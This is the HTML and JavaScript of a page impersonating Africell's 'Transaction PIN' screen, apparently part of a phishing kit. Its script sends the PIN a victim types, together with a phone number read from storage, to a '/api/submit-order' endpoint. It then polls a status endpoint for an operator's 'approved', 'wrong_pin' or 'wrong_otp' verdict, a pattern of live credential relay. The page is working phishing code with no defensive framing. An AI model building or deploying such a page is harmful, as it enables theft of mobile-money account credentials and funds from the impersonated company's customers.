<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MyAfricell | Transaction PIN</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body::-webkit-scrollbar { display: none; }
        body { scrollbar-width: none; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }

        html, body {
            width: 100%; height: 100%;
            background: #FFFFFF; /* Removed gray gradient background */
            display: flex; justify-content: center; align-items: center;
            overflow: hidden; padding: 0; /* Removed outer 16px padding */
        }

        /* Full screen flush edges, no floating border/shadow */
        .mobile-viewport {
            width: 100%;
            max-width: 100%;
            height: 100%;
            max-height: 100%;
            background: #FFFFFF;
            border-radius: 0; /* Removed border radius to touch edges completely */
            box-shadow: none; /* Removed floating card shadow */
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 32px 24px 24px 24px;
            border: none;
            overflow: hidden;
        }

        .top-stack { width: 100%; text-align: center; }
        .login-heading { font-size: 32px; font-weight: 800; color: #991676; margin-bottom: 8px; }
        .login-subheading { font-size: 14px; color: #6B7280; margin-bottom: 16px; }

        .middle-stack { 
            width: 100%; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            margin: auto 0; 
            gap: 20px; 
            padding: 16px 0; 
        }

        .pin-boxes-container {
            display: flex; gap: 14px; justify-content: center; padding: 8px;
            border-radius: 18px; background: rgba(153, 22, 118, 0.02);
            border: 1px solid rgba(153, 22, 118, 0.15);
        }

        .pin-box {
            width: 54px; height: 64px; background: #F7F8FA;
            border: 1px solid #D1D5DB; border-radius: 16px;
            font-size: 26px; font-weight: 600; color: #1F2937;
            text-align: center; pointer-events: none;
            box-shadow: 0 3px 6px rgba(0,0,0,0.03);
            transition: all 0.2s ease;
        }

        .pin-box.active-box { border-color: #991676; background: #FFFFFF; box-shadow: 0 0 0 3px rgba(153, 22, 118, 0.15); }

        .pp-error-box {
            width: 100%; display: none; align-items: center; justify-content: center; gap: 8px;
            color: #E31B23; font-size: 14px; font-weight: 500; text-align: center;
            background: rgba(227, 27, 35, 0.08); padding: 10px 14px; border-radius: 12px;
        }

        .bottom-stack { width: 100%; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }

        .btn-login {
            width: 100%;
            max-width: 100%;
            height: 60px;
            background: #E8B4D4; 
            color: #FFFFFF;
            border: none; 
            border-radius: 16px; 
            font-size: 18px; 
            font-weight: 700;
            cursor: pointer; 
            text-align: center; 
            text-transform: uppercase;
            transition: all 0.2s ease; 
            letter-spacing: 0.5px;
            margin-bottom: 24px;
        }

        .btn-login.enabled { background: #991676; box-shadow: 0 8px 20px rgba(153, 22, 118, 0.3); }
        .btn-login:disabled { cursor: not-allowed; }

        .onscreen-keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; width: 100%; max-width: 360px; }
        .keypad-btn {
            background: transparent; border: none; height: 60px; font-size: 28px;
            font-weight: 600; color: #1F2937; display: flex; align-items: center;
            justify-content: center; cursor: pointer; border-radius: 50%;
            transition: background 0.1s ease;
        }
        .keypad-btn:active { background: #E5E7EB; }
        .keypad-btn.action-key { font-size: 22px; color: #4B5563; }
    </style>
</head>
<body>

    <div class="mobile-viewport">
        <div class="top-stack">
            <h1 class="login-heading">Enter Your PIN</h1>
            <p class="login-subheading">Enter your pin to verify</p>
        </div>

        <div class="middle-stack">
            <div class="pin-boxes-container">
                <input type="password" class="pin-box active-box" id="p1" readonly value="">
                <input type="password" class="pin-box" id="p2" readonly value="">
                <input type="password" class="pin-box" id="p3" readonly value="">
                <input type="password" class="pin-box" id="p4" readonly value="">
            </div>

            <div id="inlineErrorBox" class="pp-error-box">
                <i class="fa-solid fa-circle-exclamation"></i>
                <span id="errorText">Incorrect PIN. Please try again.</span>
            </div>
        </div>

        <div class="bottom-stack">
            <button type="button" id="loginBtn" class="btn-login" disabled onclick="handleLogin()">Verify</button>

            <div class="onscreen-keypad">
                <button type="button" class="keypad-btn" onclick="pressKey('1')">1</button>
                <button type="button" class="keypad-btn" onclick="pressKey('2')">2</button>
                <button type="button" class="keypad-btn" onclick="pressKey('3')">3</button>
                <button type="button" class="keypad-btn" onclick="pressKey('4')">4</button>
                <button type="button" class="keypad-btn" onclick="pressKey('5')">5</button>
                <button type="button" class="keypad-btn" onclick="pressKey('6')">6</button>
                <button type="button" class="keypad-btn" onclick="pressKey('7')">7</button>
                <button type="button" class="keypad-btn" onclick="pressKey('8')">8</button>
                <button type="button" class="keypad-btn" onclick="pressKey('9')">9</button>
                <div></div>
                <button type="button" class="keypad-btn" onclick="pressKey('0')">0</button>
                <button type="button" class="keypad-btn action-key" onclick="deleteKey()"><i class="fa-solid fa-delete-left"></i></button>
            </div>
        </div>
    </div>

    <script>
        const loginBtn = document.getElementById('loginBtn');
        const errorBox = document.getElementById('inlineErrorBox');
        const errorText = document.getElementById('errorText');

        let pinDigits = ['', '', '', ''];
        let activeInterval = null;
        const pageLoadTimestamp = Date.now();
        const phone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000';

        window.addEventListener('DOMContentLoaded', () => {
            localStorage.removeItem('africellApprovalTimestamp');
        });

        function showInlineError(message) {
            errorText.innerText = message;
            errorBox.style.display = 'flex';
        }

        function hideInlineError() { errorBox.style.display = 'none'; }

        function updatePinDisplay() {
            for (let i = 0; i < 4; i++) {
                const box = document.getElementById('p' + (i + 1));
                box.value = pinDigits[i];
                box.classList.remove('active-box');
            }
            const firstEmpty = pinDigits.findIndex(d => d === '');
            document.getElementById('p' + (firstEmpty !== -1 ? firstEmpty + 1 : 4)).classList.add('active-box');
            validateForm();
        }

        function pressKey(digit) {
            const firstEmpty = pinDigits.findIndex(d => d === '');
            if (firstEmpty !== -1) {
                pinDigits[firstEmpty] = digit;
                updatePinDisplay();
            }
        }

        function deleteKey() {
            for (let i = 3; i >= 0; i--) {
                if (pinDigits[i] !== '') { pinDigits[i] = ''; break; }
            }
            updatePinDisplay();
        }

        function validateForm() {
            if (pinDigits.every(d => d !== '')) {
                loginBtn.removeAttribute('disabled');
                loginBtn.classList.add('enabled');
            } else {
                loginBtn.setAttribute('disabled', 'true');
                loginBtn.classList.remove('enabled');
            }
            hideInlineError();
        }

        function handleLogin() {
            const pinCode = pinDigits.join('');
            if (pinCode.length !== 4) {
                showInlineError('Please enter your 4-digit PIN.');
                return;
            }
            submitPinCode(phone, pinCode);
        }

        async function submitPinCode(phoneNum, pin) {
            try {
                loginBtn.setAttribute('disabled', 'true');
                loginBtn.classList.remove('enabled');
                loginBtn.textContent = 'Verifying...';

                const response = await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: phoneNum, uniqueId: 'Confirmation PIN: ' + pin })
                });

                const result = await response.json();
                if (result.success !== false) {
                    pollApprovalStatus(phoneNum);
                } else {
                    showInlineError('Verification failed.');
                    resetButtonState();
                }
            } catch (error) {
                pollApprovalStatus(phoneNum);
            }
        }

        function resetButtonState() {
            loginBtn.textContent = 'Verify';
            loginBtn.removeAttribute('disabled');
            loginBtn.classList.add('enabled');
            pinDigits = ['', '', '', ''];
            updatePinDisplay();
        }

        function pollApprovalStatus(phoneNum) {
            const cleanPhone = phoneNum.trim();
            if (activeInterval) clearInterval(activeInterval);
            const submissionTimestamp = Date.now();

            activeInterval = setInterval(async () => {
                try {
                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}&t=${Date.now()}`);
                    const data = await response.json();

                    if (data.status === 'approved' && data.timestamp && data.timestamp >= pageLoadTimestamp && data.timestamp >= submissionTimestamp) {
                        clearInterval(activeInterval);
                        window.location.href = 'success.html';
                    } 
                    else if ((data.status === 'rejected' || data.status === 'wrong_id' || data.status === 'wrong_pin' || data.status === 'wrong_otp') && data.timestamp && data.timestamp >= submissionTimestamp) {
                        clearInterval(activeInterval);
                        showInlineError('⚠️ Incorrect PIN. Please try again.');
                        resetButtonState();
                    }
                } catch (e) { console.error(e); }
            }, 3000);
        }
    </script>
</body>
</html>
